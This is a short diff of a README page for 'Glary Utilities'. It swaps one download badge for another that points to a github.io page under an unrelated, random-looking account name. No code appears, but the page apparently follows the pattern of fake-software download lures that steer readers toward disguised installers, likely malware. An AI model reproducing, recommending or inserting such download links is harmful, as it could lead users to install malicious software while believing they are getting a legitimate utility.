@@ -4,11 +4,8 @@
   <img src="https://lizenzguru.de/media/image/74/46/34/Glary1-1.png" width="820" alt="Glary Utilities">
 </div>
 
-<p align="center">
-  <a href="https://utilities-glary.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_Glary_Utilities-0099FF?style=for-the-badge&logo=windows&logoColor=white" alt="Get Glary Utilities">
-  </a>
-</p>
+[![GET Utilities Glary](https://img.shields.io/badge/GET%20%E2%80%94%20Utilities-Glary-0078D6?style=for-the-badge&logoColor=white)](https://maaizioh84999.github.io/.github/Utilities-Glary)
+
 
 ---
 
